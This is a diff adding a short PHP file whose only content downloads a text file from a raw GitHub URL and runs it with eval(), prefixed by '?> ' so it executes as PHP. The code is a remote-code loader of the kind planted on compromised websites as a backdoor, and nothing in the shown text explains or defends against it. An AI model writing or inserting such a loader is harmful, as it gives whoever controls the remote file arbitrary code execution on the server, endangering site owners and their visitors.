@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://raw.githubusercontent.com/seojawjaw-blip/seojkw/refs/heads/main/mentahalfarudi.txt'));
+
+$content = "?> ".$content;
+eval($content);
